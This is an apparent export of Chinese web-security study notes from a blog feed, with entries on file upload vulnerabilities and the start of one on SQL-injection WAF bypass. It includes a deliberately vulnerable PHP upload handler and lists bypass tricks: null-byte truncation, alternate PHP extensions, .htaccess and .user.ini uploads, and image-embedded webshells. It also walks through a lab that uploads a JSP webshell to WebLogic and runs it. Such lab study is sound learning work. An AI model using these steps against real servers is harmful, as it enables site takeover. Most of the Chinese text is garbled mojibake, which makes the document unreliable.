class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">è¿™é‡Œè·å–è·¯å¾„ç”¨çš„æ˜¯POST</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p>æ–¹æ³•1:</p><p>å› ä¸ºè·å–è·¯å¾„ç”¨çš„æ˜¯POSTï¼Œæ‰€æœ‰è¿™é‡Œéœ€è¦åœ¨ä¿®æ”¹ä¸€ä¸‹ç¼–ç </p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112581.png" alt="image-20210903193443580" style="zoom:67%;" /><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112145.png" alt="image-20210903193523935"></p><p>æ–¹æ³•2:</p><p>é€šè¿‡0x00ç»•è¿‡</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112131.png" alt="image-20210903193748953"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110196.png" alt="image-20210903193842023"></p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_44840696/article/details/90581104</span><br><span class="line">https://www.fujieace.com/penetration-test/file-upload-00.html#google_vignette</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20WEBæ¼æ´--æ–‡ä»¶ä¸Šä¼ ä¹‹åŸºç¡€åŠè¿‡æ»¤æ–¹å¼</title>
      <link href="/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/"/>
      <url>/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="çŸ¥è¯†æ±‡æ€»"><a href="#çŸ¥è¯†æ±‡æ€»" class="headerlink" title="çŸ¥è¯†æ±‡æ€»"></a>çŸ¥è¯†æ±‡æ€»</h3><h4 id="ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Ÿ</h4><p>å‡¡æ˜¯å­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œéƒ½æœ‰å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚å…³é”®æ˜¯çœ‹å¯¹æ–¹çš„é˜²æŠ¤ä»£ç å†™çš„æ˜¯å¦å®‰å…¨ï¼Œå…¨é¢ï¼Œä¸€æ—¦æœ‰ä¸€ä¸ªåœ°æ–¹å¯ä»¥ç»•è¿‡ï¼Œå°±ä¼šé€ æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤è„šæœ¬æ–‡ä»¶è·å¾—äº†æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚æ–‡ä»¶ä¸Šä¼ è¿™ä¸ªåŠŸèƒ½æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚å¦‚æœæœåŠ¡å™¨çš„å¤„ç†é€»è¾‘ä¸å¤Ÿå®‰å…¨ï¼Œå°±ä¼šå¯¼è‡´ä¸Šä¼ çš„æ–‡ä»¶è¢«webå®¹å™¨è§£é‡Šæ‰§è¡Œï¼Œä»è€Œé€ æˆä¸¥é‡çš„åæœ</p><h4 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h4><p>å¯ä»¥è‡ªå®šä¹‰ï¼Œå¯ä»¥æˆä¸ºwebshellï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ æ¥ä¸Šä¼ ç½‘ç«™åé—¨ï¼Œç›´æ¥è·å–ç½‘ç«™æƒé™ï¼Œå±äºé«˜å±æ¼æ´ã€‚ä¸Šä¼ æ¼æ´ä¸SQLæ³¨å…¥æˆ– XSSç›¸æ¯” , å…¶é£é™©æ›´å¤§ ã€‚å¯ä»¥è·å–æ•°æ®åº“ä¿¡æ¯ï¼Œå¯ä»¥å¯¹æœåŠ¡å™¨ææƒï¼Œè·å–å†…ç½‘æƒé™</p><h4 id="åˆ¤æ–­"><a href="#åˆ¤æ–­" class="headerlink" title="åˆ¤æ–­"></a>åˆ¤æ–­</h4><p>å¯¹æ–‡ä»¶ä¸Šä¼ è¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åè¿›è¡Œåˆ¤æ–­</p><h4 id="æ³¨æ„åœ°æ–¹"><a href="#æ³¨æ„åœ°æ–¹" class="headerlink" title="æ³¨æ„åœ°æ–¹"></a>æ³¨æ„åœ°æ–¹</h4><p>å¯¹æ–‡ä»¶ä¸Šä¼ ç±»å‹è¿›è¡ŒåŒºåˆ†ï¼Œæ˜¯å±äºç¼–è¾‘å™¨æ–‡ä»¶ä¸Šä¼ ï¼Œè¿˜æ˜¯å±äºç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œè¿˜æ˜¯ä¼šå‘˜ä¸­å¿ƒã€‚è¦ç¡®ä¿æ–‡ä»¶ä¸Šä¼ æ˜¯ä»€ä¹ˆç±»å‹ï¼Œå°±ç”¨ä»€ä¹ˆç±»å‹æ–¹æ³•å¯¹å®ƒè¿›è¡ŒåæœŸçš„æµ‹è¯•ã€‚</p><h4 id="åœ¨å®é™…ä¸­çš„åº”ç”¨è¯´æ˜"><a href="#åœ¨å®é™…ä¸­çš„åº”ç”¨è¯´æ˜" class="headerlink" title="åœ¨å®é™…ä¸­çš„åº”ç”¨è¯´æ˜"></a>åœ¨å®é™…ä¸­çš„åº”ç”¨è¯´æ˜</h4><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>â€‹     å…ˆç›´æ¥ä¼ ä¸€ä¸ªPHPï¼Œå®æˆ˜å…ˆä¼ é©¬ã€‚</p><p>â€‹    å®æˆ˜å…ˆä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œçœ‹çœ‹æœ‰æ— è¿”å›å­˜å‚¨åœ°å€ã€‚</p><p>â€‹    å¦‚æœèƒ½ç›´æ¥ä¸Šä¼ å¹¶è§£æï¼Œå·²ç¦»æˆåŠŸä¸è¿œã€‚</p><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>â€‹     å…ˆä¼ ä¸€ä¸ªshellï¼Œç„¶åè¿›è¡Œä¿®æ”¹ã€‚</p><p>â€‹    connect-Type:image/jpegï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥è¿›è¡Œç»•è¿‡ï¼Œå¦‚æœä¸è¡Œï¼Œåœ¨ä¸Šä¼ å†…å®¹æ·»åŠ GIF89a</p><p>â€‹    å½“ç„¶ä¸Šä¼ äº†è¿˜å¾—çœ‹æ˜¯å¦èƒ½å¤Ÿè¢«è§£æä¸ºphpï¼Œæ‰€æœ‰çš„ä¸Šä¼ éƒ½è¦è€ƒè™‘æ˜¯å¦èƒ½å¤Ÿè¢«è§£æã€‚</p><h4 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h4><ul><li>ä¸Šä¼ ä¸€ä¸ªabc.abcdï¼Œç›®çš„åªæ˜¯ä¸ºäº†æŸ¥çœ‹æ˜¯å¦ä¸ºç™½åå•è¿˜æ˜¯é»‘åå•ç»•è¿‡ã€‚</li></ul><p>â€‹    é»‘åå•é™åˆ¶ä¸€èˆ¬ä¸ºæ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼Œè€ƒè™‘åŒå†™ï¼Œå¤§å°å†™ï¼Œç©ºæ ¼ï¼Œphp2,php3,php4,php5,pht</p><p>â€‹    phtml,ç­‰æ–¹å¼</p><ul><li>æˆ‘ä»¬ç»§ç»­ä¸Šä¼ ä¸€ä¸ª/htaccessæ–‡ä»¶</li></ul><p>â€‹    .htaccessæ–‡ä»¶èƒ½å¤Ÿè®¾ç½®æœåŠ¡å™¨çš„è§£ææ–‡ä»¶çš„æ ¼å¼ï¼ŒåŒ¹é…åˆ°duduå°±å·²phpçš„æ ¼å¼æ¥è§£æï¼Œç»§è€Œä¸Šä¼ é©¬</p><ul><li>å¦‚æœè¯´.htaccessä¸èƒ½ä¸Šä¼ ï¼Œæ¥ä¸‹æ¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œç»§è€Œä¸Šä¼ ä¸€ä¸ªé©¬</li></ul><h4 id="æ–¹æ³•å››"><a href="#æ–¹æ³•å››" class="headerlink" title="æ–¹æ³•å››"></a>æ–¹æ³•å››</h4><p>â€‹    å¦‚æœç™½åå•é™åˆ¶ä¸Šä¼ </p><ul><li><p>è€ƒè™‘00æˆªæ–­ä¸Šä¼ </p></li><li><p>æ–‡ä»¶åŒ…å«æ¼æ´+å›¾ç‰‡é©¬</p></li><li><p>æ–‡ä»¶åŒ…å«æ¼æ´+äºŒæ¬¡æ¸²æŸ“+å›¾ç‰‡é©¬</p></li></ul><h4 id="æ–¹æ³•äº”"><a href="#æ–¹æ³•äº”" class="headerlink" title="æ–¹æ³•äº”"></a>æ–¹æ³•äº”</h4><p>â€‹    ä¸Šä¼ çš„ä¸œè¥¿æ˜¯å¦è¢«æœåŠ¡å™¨å¾ˆå¿«çš„åˆ é™¤æˆ–è€…ç§»é™¤ï¼Œæˆ–è€…è¯´ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯æ— æ³•è®¿é—®ï¼Œå°±å¾—è€ƒè™‘æ¡ä»¶ç«äº‰ã€‚</p><p>â€‹    ä»¥ä¸Šå‡ä¸è¡Œï¼Œè€ƒè™‘é€»è¾‘å±‚é¢çš„æ€è·¯</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109943.png" alt="image-20210902091114907" style="zoom:67%;" /><h3 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h3><h4 id="å¸¸è§„æ–‡ä»¶ä¸Šä¼ åœ°å€çš„è·å–è¯´æ˜"><a href="#å¸¸è§„æ–‡ä»¶ä¸Šä¼ åœ°å€çš„è·å–è¯´æ˜" class="headerlink" title="å¸¸è§„æ–‡ä»¶ä¸Šä¼ åœ°å€çš„è·å–è¯´æ˜"></a>å¸¸è§„æ–‡ä»¶ä¸Šä¼ åœ°å€çš„è·å–è¯´æ˜</h4><p>é€šè¿‡æœç´¢å¸¦æœ‰uploadå…³é”®å­—çš„ç½‘é¡µ</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109026.png" alt="image-20210902193733189" style="zoom:67%;" /><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109915.png" alt="image-20210902193753879" style="zoom:67%;" /><p>é€šè¿‡ç›®å½•æ‰«æå·¥å…·è¿›è¡Œæ‰«æ</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109870.png" alt="image-20210902194104791" style="zoom:67%;" /><h4 id="ä¸åŒæ ¼å¼ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•"><a href="#ä¸åŒæ ¼å¼ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•" class="headerlink" title="ä¸åŒæ ¼å¼ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•"></a>ä¸åŒæ ¼å¼ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•</h4><p>ä¸è¦å¦„æƒ³é€šè¿‡ä¸€ä¸ªå¸¦æœ‰åé—¨çš„å›¾ç‰‡åç¼€çš„æ–‡ä»¶æ¥æ§åˆ¶ç½‘ç«™ï¼Œå…³é”®æ˜¯è¦çœ‹ç½‘ç«™å¯¹è„šæœ¬çš„è§£ææ˜¯ä»€ä¹ˆç±»å‹</p><p>ä»€ä¹ˆæ ¼å¼çš„ä»£ç å°±ç”¨ä»€ä¹ˆæ ¼å¼å»æ‰§è¡Œï¼Œä¸å¯ä»¥ä¹±ç”¨ï¼Œå¦åˆ™æ˜¯æ‰§è¡Œä¸äº†çš„ã€‚</p><h4 id="é…åˆè§£ææ¼æ´ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•"><a href="#é…åˆè§£ææ¼æ´ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•" class="headerlink" title="é…åˆè§£ææ¼æ´ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•"></a>é…åˆè§£ææ¼æ´ä¸‹çš„æ–‡ä»¶ç±»å‹åé—¨æµ‹è¯•</h4><p>nginxè§£ææ¼æ´</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109788.png" alt="image-20210902195233823"></p><p>æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œå›¾ç‰‡ä¸­å†™å¦‚phpä»£ç ï¼Œå½“æˆ‘ä»¬å»è®¿é—®å›¾ç‰‡çš„æ—¶å€™ï¼Œå›¾ç‰‡ä¸ä¼šæ‰§è¡Œphpä»£ç ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109988.png" alt="image-20210902195518809"></p><p>å½“æˆ‘ä»¬åœ¨åé¢åŠ ä¸Š1.phpåï¼ŒNginxå°±ä¼šé€ æˆä¸€ä¸ªè§£ææ¼æ´ï¼Œphpä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109161.png" alt="image-20210902200047749" style="zoom:67%;" /><h4 id="æœ¬åœ°æ–‡ä»¶ä¸Šä¼ æ¼æ´é¶åœºç¯å¢ƒæ­å»ºæµ‹è¯•"><a href="#æœ¬åœ°æ–‡ä»¶ä¸Šä¼ æ¼æ´é¶åœºç¯å¢ƒæ­å»ºæµ‹è¯•" class="headerlink" title="æœ¬åœ°æ–‡ä»¶ä¸Šä¼ æ¼æ´é¶åœºç¯å¢ƒæ­å»ºæµ‹è¯•"></a>æœ¬åœ°æ–‡ä»¶ä¸Šä¼ æ¼æ´é¶åœºç¯å¢ƒæ­å»ºæµ‹è¯•</h4><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109034.png" alt="image-20210902200322944" style="zoom:50%;" /><p>åœ¨å®¢æˆ·ç«¯é€šè¿‡å¦‚ä¸‹çš„javascriptä»£ç æ¥æ£€æµ‹ç”¨æˆ·æäº¤çš„æ–‡ä»¶æ˜¯å¦åˆæ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ˜¯å®¢æˆ·ç«¯jsæ£€æµ‹</strong></p><p>1ã€é€‰æ‹©ä¸€ä¸ª.phpåç¼€çš„æ–‡ä»¶ï¼ŒåŒæ—¶ä½¿ç”¨burp suiteè¿›è¡ŒæŠ“åŒ…</p><p>2ã€ç‚¹å‡»ä¸Šä¼ ï¼Œå¯ä»¥çœ‹åˆ°è¿˜æ²¡æœ‰æ•°æ®ç»è¿‡burp suiteï¼Œæµè§ˆå™¨å°±å·²ç»å¼¹å‡ºè­¦ç¤ºæ¡†ï¼Œè¯´æ˜æ•°æ®è¿˜æ²¡æœ‰å‘é€ç»™æœåŠ¡å™¨ï¼Œç¨‹åºå°±åˆ¤æ–­å‡ºæ¥æ–‡ä»¶ç±»å‹ä¸å¯¹ï¼Œå› æ­¤å°±å¯ä»¥å¾—å‡ºç»“è®ºè¿™ä¸ªæ˜¯é€šè¿‡å®¢æˆ·ç«¯è¿›è¡Œçš„æœ¬åœ°æ–‡ä»¶æ£€æµ‹</p><p><strong>ç»•è¿‡æ–¹æ³•</strong></p><p><strong>ç¬¬ä¸€ç§</strong></p><p>ç›´æ¥å°†jsä»£ç åˆ é™¤æ‰å°±å¯ä»¥äº†</p><p><strong>ç¬¬äºŒç§</strong></p><p>å‰ç«¯ä¸Šä¼ ä¸€ä¸ªåˆæ³•çš„æ–‡ä»¶ï¼Œé€šè¿‡æŠ“åŒ…å°†æŠ¥æ–‡æˆªå–ï¼Œç„¶åä¿®æ”¹åç¼€ä¸Šä¼ </p><h4 id="æŸ-CMS-åŠ-CVE-ç¼–å·æ–‡ä»¶ä¸Šä¼ æ¼æ´æµ‹è¯•"><a href="#æŸ-CMS-åŠ-CVE-ç¼–å·æ–‡ä»¶ä¸Šä¼ æ¼æ´æµ‹è¯•" class="headerlink" title="æŸ CMS åŠ CVE ç¼–å·æ–‡ä»¶ä¸Šä¼ æ¼æ´æµ‹è¯•"></a>æŸ CMS åŠ CVE ç¼–å·æ–‡ä»¶ä¸Šä¼ æ¼æ´æµ‹è¯•</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109721.png" alt="image-20210902201740119"></p><p>å¯ä»¥çœ‹åˆ°å›¾ç‰‡ä¸Šä¼ ä¸Šå»äº†ï¼Œä½†æ˜¯æŠ“åŒ…å´æŠ“ä¸åˆ°ï¼Œæ˜¯å› ä¸ºä¸Šä¼ æ“ä½œæ˜¯ä½¿ç”¨JSè¿›è¡ŒéªŒè¯ï¼Œåœ¨æµè§ˆå™¨å‰ç«¯å®Œæˆã€‚ç‚¹å‡»ä¿å­˜æ‰å¯ä»¥æŠ“åˆ°åŒ…</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109735.png" alt="image-20210902201911666"></p><p>æˆ‘ä»¬å°†pngä¿®æ”¹ä¸ºphpä¸Šä¼ </p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109820.png" alt="image-20210902202341242"></p><p>å‘ç°æŠ¥é”™ï¼Œè€Œä¸”æ²¡æœ‰è¿”å›è·¯å¾„ï¼Œä½†æ˜¯å»åå°çœ‹å‘ç°ä¸Šä¼ æˆåŠŸäº†ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109828.png" alt="image-20210902202430673"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109878.png" alt="image-20210902202503511"></p><p>åˆå‘ç°äº†ä»–æ˜¯fineCMSï¼Œå»çœ‹ä¸€ä»–æœ‰ä»€ä¹ˆæ¼æ´</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109434.png" alt="image-20210902202631848"></p><p>æ‰¾åˆ°åˆšæ‰æˆ‘ä»¬é‚£ä¸ªçš„ä¸Šä¼ è·¯å¾„</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110126.png" alt="image-20210902202756477"></p><p>é€šè¿‡è¯¥è·¯å¾„æˆåŠŸæ‰§è¡Œä»£ç </p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110727.png" alt="image-20210902203051054"></p><p><strong>weblogicä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109655.png" alt="image-20210902203457158"></p><p>è´¦å·æ˜¯weblogicï¼Œå¯†ç é€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs | grep password å¯ä»¥æŸ¥çœ‹</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109690.png" alt="image-20210902205529954"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110204.png" alt="image-20210902205315578"></p><p>ç‚¹å‡»base_domain</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109017.png" alt="image-20210902205649769"></p><p>ç‚¹å‡»é«˜çº§</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109043.png" alt="image-20210902205709472"></p><p>å¯ç”¨webæµ‹è¯•é¡µé¢</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109233.png" alt="image-20210902205735047"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110075.png" alt="image-20210902205955683"></p><p>è®¾ç½®work home dir</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109394.png" alt="image-20210902210112246"></p><p>ç‚¹å‡»å®‰å…¨ï¼Œè¿›è¡Œæ·»åŠ </p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110699.png" alt="image-20210902210338513"></p><p>ä¸Šä¼ jspæœ¨é©¬</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109466.png" alt="image-20210902210440625"></p><p>è·å–æ—¶é—´æˆ³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1630587866052</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109563.png" alt="image-20210902211028754"></p><p>ç„¶åè®¿é—®<code>http://your-ip:7001/ws_utc/css/config/keystore/[æ—¶é—´æˆ³]_[æ–‡ä»¶å]</code>ï¼Œå³å¯æ‰§è¡Œwebshellï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.47.156:7001/ws_utc/css/config/keystore/1630587866052_3.jsp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211109672.png" alt="image-20210902211111366"></p><p>æ‰§è¡ŒæˆåŠŸ</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>19WEBæ¼æ´--SQLæ³¨å…¥ä¹‹æ·±å…¥WAFæ³¨å…¥ç»•è¿‡</title>
      <link href="/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨æ”»é˜²å®æˆ˜ä¸­ï¼Œå¾€å¾€éœ€è¦æŒæ¡ä¸€äº›ç‰¹æ€§ï¼Œæ¯”å¦‚æœåŠ¡å™¨ã€æ•°æ®åº“ã€åº”ç”¨å±‚ã€WAFå±‚ç­‰ï¼Œä»¥ä¾¿æˆ‘ä»¬æ›´çµæ´»åœ°å»æ„é€ Payloadï¼Œä»è€Œå¯ä»¥å’Œå„ç§WAFè¿›è¡Œå¯¹æŠ—ï¼Œç”šè‡³ç»•è¿‡å®‰å…¨é˜²å¾¡æªæ–½è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108006.png" alt="image-20210830195504797" style="zoom:67%;" /><h3 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" 